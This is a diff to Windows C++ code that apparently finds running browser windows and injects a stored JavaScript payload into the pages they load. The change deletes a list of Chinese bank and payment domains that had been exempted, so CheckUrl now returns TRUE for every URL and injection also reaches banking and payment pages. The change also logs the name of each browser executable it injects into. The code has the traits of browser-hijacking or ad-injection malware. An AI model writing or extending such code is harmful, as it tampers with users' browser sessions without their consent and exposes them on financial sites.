@@ -374,7 +374,7 @@ BOOL GetProcessName(DWORD processID,WCHAR *pszProcessName,DWORD dwBufferLen )
 
 
 
-BOOL CheckBrowser(HWND hWnd)
+BOOL CheckBrowser(HWND hWnd,CString &strBrowserExeName)
 {
 	DWORD dwProcessID = 0;
 	DWORD dwThread = GetWindowThreadProcessId(hWnd,&dwProcessID);
@@ -412,6 +412,7 @@ BOOL CheckBrowser(HWND hWnd)
 			)
 		{
 			bInjectMatrix = TRUE;
+			strBrowserExeName = strExeName;
 		}
 	}
 
@@ -422,31 +423,6 @@ BOOL CheckBrowser(HWND hWnd)
 BOOL CheckUrl(CString strUrl)
 {
 	return TRUE;
-	if(
-		strUrl.Find(TEXT("taobao.com")) >= 0 ||
-		strUrl.Find(TEXT("boc.cn")) >= 0 ||
-		strUrl.Find(TEXT("icbc.com.cn")) >= 0 ||
-		strUrl.Find(TEXT("ccb.com")) >= 0 ||
-		strUrl.Find(TEXT("abchina.com")) >= 0 ||
-		strUrl.Find(TEXT("psbc.com")) >= 0 ||
-		strUrl.Find(TEXT("bankcomm.com")) >= 0 ||
-		strUrl.Find(TEXT("hxb.com.cn")) >= 0 ||
-		strUrl.Find(TEXT("cmbchina.com")) >= 0 ||
-		strUrl.Find(TEXT("ecitic.com")) >= 0 ||
-		strUrl.Find(TEXT("cmbc.com.cn")) >= 0 ||
-		strUrl.Find(TEXT("cib.com.cn")) >= 0 ||
-		strUrl.Find(TEXT("cgbchina.com.cn")) >= 0 ||
-		strUrl.Find(TEXT("spdb.com.cn")) >= 0 ||
-		strUrl.Find(TEXT("cebbank.com")) >= 0 ||
-		strUrl.Find(TEXT("pingan.com")) >= 0 ||
-		strUrl.Find(TEXT("alipay.com")) >= 0 ||
-		strUrl.Find(TEXT("unionpay.com")) >= 0
-		)
-	{
-		return FALSE;		
-	}
-	return  TRUE;
-
 }
 //处理通知消息
 VOID HandleEvent(
@@ -474,8 +450,8 @@ VOID HandleEvent(
 		}
 		
 
-
-		BOOL bInject = CheckBrowser(hwnd);
+		CString strExeName;
+		BOOL bInject = CheckBrowser(hwnd,strExeName);
 		if( FALSE == bInject )
 		{
 			break;
@@ -510,7 +486,7 @@ VOID HandleEvent(
 		}
 
 		BOOL bCheckRes = WinUrlMgr.CheckWinUrl(hwnd,strUrl);
-		if ( strUrl.Find(L"res://") < 0 && FALSE == bCheckRes )
+		if ( strUrl.Find(L"res://") < 0 && FALSE == bCheckRes && g_strJsData.GetLength() > 0 )
 		{
 			//插入矩阵JS
 			BOOL bJzJsRes = InjectScriptText(pWb,g_strJsData,g_bJsUrl);
@@ -520,7 +496,7 @@ VOID HandleEvent(
 				WinUrlMgr.AddOrModifyWinUrl(hwnd,strUrl);
 
 				CString strDebugOut;
-				strDebugOut.Format(L"插入矩阵 %s\n",strUrl);
+				strDebugOut.Format(L"插入矩阵 %s %s\n",strExeName,strUrl);
 				MyOutputDebugStringW(strDebugOut);
 
 			}
